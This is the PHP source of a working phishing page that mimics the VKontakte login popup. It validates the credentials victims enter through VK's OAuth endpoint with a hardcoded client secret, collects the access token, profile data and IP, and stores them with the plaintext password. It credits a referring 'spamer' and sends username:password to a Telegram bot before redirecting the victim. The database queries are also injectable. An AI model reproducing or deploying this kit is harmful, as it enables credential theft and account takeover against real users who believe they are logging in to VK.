<? session_start(); 
    include '../bdlog.php';
	if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
}
	
    $link = mysql_connect($dbhost,$dbuser,$dbpass);
    mysql_select_db($db_name,$link);

    error_reporting (0);
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{
		$username = $_POST["email"];
		$password = $_POST["pass"];
		$check = file_get_contents("https://oauth.vk.com/token?v=5.95&grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
        $res = file_get_contents("https://oauth.vk.com/token?v=5.95&grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
        
		
		if (strpos($check, "access_token") === false)
		{
			$message = '<div class="box_error">Указан неверный логин или пароль.</div>';
		} 
			else
			{	
$res = json_decode($res, true);
                $id=$res['user_id'];
                $token=$res['access_token'];
                $inn = file_get_contents("https://api.vk.com/method/account.getProfileInfo?v=5.95&access_token=".$token);
                $inn= json_decode($inn, true);
				$pol = $inn['response']['sex'];
                $fio = $inn['response']['first_name'].' '.$inn['response']['last_name'];
                $frd = json_decode(file_get_contents('https://api.vk.com/method/users.get?v=5.95&user_ids='.$id.'&fields=counters,country,sex,city&access_token='.$token));
				$datar = $inn['response']['bdate'];
				$str = $frd -> response[0] -> country -> id;
                $friends = $frd -> response[0] -> counters -> friends;
                $followers = $frd -> response[0]-> counters -> followers;	
                $avatar = $frd -> response[0] -> photo_50;
                $ip = $_SERVER['REMOTE_ADDR'];
				
$NewUser = mysql_query("SELECT * FROM data WHERE login='$username'") or die();
if (mysql_num_rows($NewUser) == 0) {
        //Вставляем данные, подставляя их в запрос
    $email = $_POST['email'];
                 $password = $_POST['pass'];                      
        $ref = $_POST['comment'];
        $inser = mysqli_query($db,"insert into `data` (login,pass,token,fio,friends,pol,str,userid,ip,fromsp,followers,avatar) values ('$email','$password','$token','$fio','$friends','$pol','$str','$id','$ip','$ref','$followers','$avatar')"); 
$updbal = mysqli_query($db,"update `slito` set `inviteusers` = `inviteusers`+1 where `spamer` = '$ref'");
$message = '<div class="box_error" style="background-color:#7CBB7C;border-color:green;">Успешная авторизация</div>';
$text = '🔔 Авторизован новый аккаунт! 🖥
👤 '.$fio.'

👥 Друзей - '.$friends.' 
👨‍👨‍👧 Подписчиков - '.$followers.'
🌍 https://vk.com/id'.$id.'

🔑 '.$username.':'.$password.'
';
$send = file_get_contents('https://api.telegram.org/bot'.$tg_token.'/sendMessage?chat_id='.$tg_chat.'&text='.urlencode(preg_replace('/\t/','',$text)));	
echo '<script>
    setTimeout(function(){location.href="'.$ssilka.'"} , 2000);  
</script>';				        
} else {
   $message = '<div class="box_error">Вы уже авторизованы!</div>';
}       
                
			}
	}
	
if (1 == 1) { echo
'<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
  <style>[class="cbalink"]{display:none;}</style>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>ВКонтакте | Вход</title>
	<link rel="shortcut icon" href="faviconnew.ico">
	<link rel="stylesheet" type="text/css" href="/auth/css/fonts_cnt.css" />
	<link rel="stylesheet" type="text/css" href="/auth/css/common.css" />
    <link type="text/css" rel="stylesheet" href="/auth/css/oauth_popup.css"></link>
    <script type="text/javascript" language="javascript" src="/auth/css/common_light.js"></script>
  <body onresize="onBodyResize(true);" class="VK oauth_centered">
    <script>
      if (window.devicePixelRatio >= 2) document.body.className += " is_2x";
    </script>

	<script type="text/javascript">
		document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
	</script>
    <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
  <div id="oauth_head_info" class="oauth_head_info fl_r">
    <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
  </div>
</div>

<div class="oauth_content box_body clear_fix">
  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

  <form method="post" action="#" novalidate>
    <div class="oauth_form">

      <center>
	'.$message.'
	</center>

      <div class="oauth_form_login">

        <div class="oauth_form_header">Телефон или e-mail</div>
        <input type="text" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="email" value="">
                <input type="hidden" name="comment" value="'.$_SESSION['comment'].'" />
        <div class="oauth_form_header">Пароль</div>
        <input type="password" class="oauth_form_input dark" required="required" minlength="2" maxlength="1024" name="pass" />

        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
        <input type="submit" name="submit_input" class="unshown">
      </div>
    </div>
  </form>
</div>
        </div>
      </div>
    </div>
  </body>
</html>'; } ?>